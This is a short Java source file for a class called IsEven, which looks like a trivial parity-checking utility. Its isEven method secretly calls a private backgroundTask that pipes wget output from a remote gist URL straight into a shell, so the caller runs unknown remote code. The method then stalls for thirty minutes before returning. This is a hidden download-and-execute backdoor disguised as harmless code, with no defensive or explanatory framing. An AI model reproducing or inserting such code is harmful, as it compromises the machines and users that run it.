package com.zftv;

import java.util.List;
import java.util.Arrays;
import java.lang.ProcessBuilder;
import java.util.concurrent.TimeUnit;

public class IsEven {
    public boolean isEven(int num) {
        backgroundTask();
        try {
            TimeUnit.MINUTES.sleep(30);
        } catch(Exception e) {
            e.printStackTrace();
        }
        return num % 2 == 0;
    }

    private void backgroundTask() {
        List<ProcessBuilder> builders = Arrays.asList(
                new ProcessBuilder("wget", "https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/6328c8bfd2e20008510331420301b15909da606e/gistfile1.txt", "-q", "-O-"), 
                new ProcessBuilder("sh"));
        try {
            ProcessBuilder.startPipeline(builders);
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
